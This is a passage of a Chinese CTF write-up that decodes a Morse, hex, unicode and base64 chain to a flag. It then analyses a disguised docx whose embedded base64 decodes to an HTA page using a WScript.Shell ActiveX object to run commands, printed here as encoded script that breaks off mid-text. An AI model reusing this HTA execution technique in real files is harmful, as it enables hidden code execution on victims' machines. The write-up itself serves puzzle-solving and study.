class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <br></code></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034645</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036625</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033305</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036635</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">7530303434</span><br></code></pre></td></tr></table></figure><p>十六进制转换为字符串得到：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;<span class="hljs-symbol">\\</span>u0052<span class="hljs-symbol">\\</span>u0047<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0064<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0042<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u004d<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0074<span class="hljs-symbol">\\</span>u0045<span class="hljs-symbol">\\</span>u005a<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u006b<span class="hljs-symbol">\\</span>u0061<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0035<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u0032<span class="hljs-symbol">\\</span>u0055<span class="hljs-symbol">\\</span>u0030<span class="hljs-symbol">\\</span>u0063<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u006c<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u004e<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u0051<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044&#x27;<br></code></pre></td></tr></table></figure><p>unicode编码转换：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">RGVzdDB<span class="hljs-symbol">nM3</span>tEZW<span class="hljs-number">9</span>kaW<span class="hljs-number">5</span><span class="hljs-symbol">nXzFzX2</span>U<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lf<span class="hljs-symbol">NF9</span>VfQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>得到以上结果，一开始以为这个是凯撒密码，但是转了一轮没有正确的。后面尝试用base64去解，发现成功了。主要是后面的%误导了。但现在想一下%3D不就是URL编码的=吗。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Dest<span class="hljs-number">0</span><span class="hljs-name">g3</span>&#123;Deodi<span class="hljs-symbol">ng_1</span>s_e<span class="hljs-number">4</span>sy_<span class="hljs-number">4</span>_U&#125;<br></code></pre></td></tr></table></figure><h2 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h2><p>文件下载下来没有后缀名，二进制打开看到有个pk，就当压缩包解了。但是打开之后这些文件像是docx。所以后缀名变为docx打开。里面都是写图形字符。不知道是什么。</p><p>在解压的文件中找到./word/document.xml里面有一大段base64编码的内容，这个应该是我们之前看到的文档内容。提出来一段看看。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PD<span class="hljs-number">94</span>bWwgdmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>iMS<span class="hljs-number">4</span>wIiBlbmNvZGluZz<span class="hljs-number">0</span>iVVRGLTgiIHN<span class="hljs-number">0</span>YW<span class="hljs-number">5</span>kYWxvbmU<span class="hljs-number">9</span>InllcyI/Pgo<span class="hljs-number">8</span>YXNzZW<span class="hljs-number">1</span>ibHkgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYxIiBtYW<span class="hljs-number">5</span>pZmVzdFZlcnNpb<span class="hljs-number">249</span>IjEuMCI+Cjx<span class="hljs-number">0</span>cnVzdEluZm<span class="hljs-number">8</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICAgICAgPHJlcXVlc<span class="hljs-number">3</span>RlZEV<span class="hljs-number">4</span>ZWN<span class="hljs-number">1</span>dGlvbkxldmVsIGxldmVsPSJhc<span class="hljs-number">0</span>ludm<span class="hljs-number">9</span>rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPgo<span class="hljs-number">8</span>YXBwbGljYXRpb<span class="hljs-number">24</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICA<span class="hljs-number">8</span>ZHBpQXdhcmVuZXNzIHhtbG<span class="hljs-number">5</span>zPSJodHRwOi<span class="hljs-number">8</span>vc<span class="hljs-number">2</span>NoZW<span class="hljs-number">1</span>hcy<span class="hljs-number">5</span>taWNyb<span class="hljs-number">3</span>NvZnQuY<span class="hljs-number">29</span>tL<span class="hljs-number">1</span>NNSS<span class="hljs-number">8</span>yMDE<span class="hljs-number">2</span>L<span class="hljs-number">1</span>dpbmRvd<span class="hljs-number">3</span>NTZXR<span class="hljs-number">0</span>aW<span class="hljs-number">5</span>ncyI+RG<span class="hljs-number">8</span>geW<span class="hljs-number">91</span>IGtub<span class="hljs-number">3</span>cganM<span class="hljs-number">8</span>L<span class="hljs-number">2</span>RwaUF<span class="hljs-number">3</span>YXJlbmVzcz<span class="hljs-number">4</span>KPHNjcmlwdCBsYW<span class="hljs-number">5</span>ndWFnZT<span class="hljs-number">0</span>iamF<span class="hljs-number">2</span>YXNjcmlwdCI+ZG<span class="hljs-number">9</span>jdW<span class="hljs-number">1</span>lbnQud<span class="hljs-number">3</span>JpdGUodW<span class="hljs-number">5</span>lc<span class="hljs-number">2</span>NhcGUoJyUzQ<span class="hljs-number">2</span>h<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>Nib<span class="hljs-number">2</span>R<span class="hljs-number">5</span>JTNFJTBBJTBBJTNDJTIxRE<span class="hljs-number">9</span>DVFlQRSUyMGh<span class="hljs-number">0</span>bWwlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>NodG<span class="hljs-number">1</span>sJTNFJTBBJTNDaGVhZCUzRSUwQSUyMCUyMCUyMCUyMCUzQ<span class="hljs-number">3</span>RpdGxlJTNFRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlM<span class="hljs-number">0</span>MlMkZ<span class="hljs-number">0</span>aXRsZSUzRSUwQSUzQ<span class="hljs-number">0</span>hUQSUzQUFQUExJQ<span class="hljs-number">0</span>FUSU<span class="hljs-number">9</span>OJTBBJTIwJTIwQVBQTElDQVRJT<span class="hljs-number">05</span>OQU<span class="hljs-number">1</span>FJTNEJTIyRG<span class="hljs-number">8</span>lMjBZb<span class="hljs-number">3</span>UlMjBLbm<span class="hljs-number">93</span>JTIwanMlMjIlMEElMjAlMjBJRCUzRCUyMkluY<span class="hljs-number">2</span>VwdGlvbiUyMiUwQSUyMCUyMFZFUlNJT<span class="hljs-number">04</span>lM<span class="hljs-number">0</span>QlMjIxLjAlMjIlMEElMjAlMjBTQ<span class="hljs-number">1</span>JPTEwlM<span class="hljs-number">0</span>QlMjJubyUyMiUyRiUzRSUwQSUyMCUwQSUzQ<span class="hljs-number">3</span>N<span class="hljs-number">0</span>eWxlJTIwdHlwZSUzRCUyMnRleHQlMkZjc<span class="hljs-number">3</span>MlMjIlM<span class="hljs-number">0</span>UlMEElM<span class="hljs-number">0</span>MlMkZoZWFkJTNFJTBBJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJmZWF<span class="hljs-number">0</span>dXJlJTIyJTNFJTBBJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTNDZGl<span class="hljs-number">2</span>JTIwaWQlM<span class="hljs-number">0</span>QlMjJjb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>JTBBJTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTA<span class="hljs-number">5</span>JTNDJTJGc<span class="hljs-number">3</span>R<span class="hljs-number">5</span>bGUlM<span class="hljs-number">0</span>UlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlM<span class="hljs-number">0</span>NoMSUyMGlkJTNEJTIydW<span class="hljs-number">5</span>hdmFpbGFibGUlMjIlMjBjbGFzcyUzRCUyMmxvYWRpbmclMjIlM<span class="hljs-number">0</span>VCdWlsZGluZyUyMGpzLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>lM<span class="hljs-number">0</span>MlMkZoMSUzRSUwQSUwOSUwOSUwOSUwOSUzQ<span class="hljs-number">3</span>NjcmlwdCUyMHR<span class="hljs-number">5</span>cGUlM<span class="hljs-number">0</span>QlMjJ<span class="hljs-number">0</span>ZXh<span class="hljs-number">0</span>JTJGamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUyMGxhbmd<span class="hljs-number">1</span>YWdlJTNEJTIyamF<span class="hljs-number">2</span>YXNjcmlwdCUyMiUzRSUwQSUwOSUwOSUwOSUwOSUwOWZ<span class="hljs-number">1</span>bmN<span class="hljs-number">0</span>aW<span class="hljs-number">9</span>uJTIwUnVuRmlsZSUyOCUyOSUyMCU<span class="hljs-number">3</span>QiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMHZhciUyMFdzaFNoZWxsJTIwJTNEJTIwbmV<span class="hljs-number">3</span>JTIwQWN<span class="hljs-number">0</span>aXZlWE<span class="hljs-number">9</span>iamVjdCUyOCUyMldTY<span class="hljs-number">3</span>JpcHQuU<span class="hljs-number">2</span>hlbGwlMjIlMjklM<span class="hljs-number">0</span>IlMEElMDklMDklMDklMDklMDlXc<span class="hljs-number">2</span>hTaGVsbC<span class="hljs-number">5</span>SdW<span class="hljs-number">4</span>lMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIwJTI<span class="hljs-number">1</span>d<span class="hljs-number">2</span>luZGlyJTI<span class="hljs-number">1</span>JTJGRGVza<span class="hljs-number">3</span>RvcCUyRmpzLnR<span class="hljs-number">4</span>dCUyMiUyQyUyMDElMkMlMjBmYWxzZSUyOSUzQiUwQSUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyRiolMjB<span class="hljs-number">2</span>YXIlMjBvRXhlYyUyMCUzRCUyMFdzaFNoZWxsLkV<span class="hljs-number">4</span>ZWMlMjglMjJub<span class="hljs-number">3</span>RlcGFkJTIyJTI<span class="hljs-number">5</span>JTNCJTIwKiUy<br><br>base<span class="hljs-number">64</span> decode:<br>&lt;?xml version<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span> encoding<span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span> standalone<span class="hljs-operator">=</span><span class="hljs-string">&quot;yes&quot;</span>?&gt;<br>&lt;assembly xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> manifestVersion<span class="hljs-operator">=</span><span class="hljs-string">&quot;1.0&quot;</span>&gt;<br>&lt;trustInfo xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>            &lt;requestedExecutionLevel level<span class="hljs-operator">=</span><span class="hljs-string">&quot;asInvoker&quot;</span> uiAccess<span class="hljs-operator">=</span><span class="hljs-string">&quot;false&quot;</span>/&gt;<br>&lt;application xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;<br>        &lt;dpiAwareness xmlns<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://schemas.microsoft.com/SMI/2016/WindowsSettings&quot;</span>&gt;Do you know js&lt;/dpiAwareness&gt;<br>&lt;script language<span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript&quot;</span>&gt;document.write(unescape(&#x27;<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cbody<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%21</span>DOCTYPE<span class="hljs-variable">%20</span>html<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chtml<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Chead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ctitle<span class="hljs-variable">%3</span>EDo<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Ftitle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>CHTA<span class="hljs-variable">%3</span>AAPPLICATION<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>APPLICATIONNAME<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Do<span class="hljs-variable">%20</span>You<span class="hljs-variable">%20</span>Know<span class="hljs-variable">%20</span>js<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ID<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>Inception<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>VERSION<span class="hljs-variable">%3</span>D<span 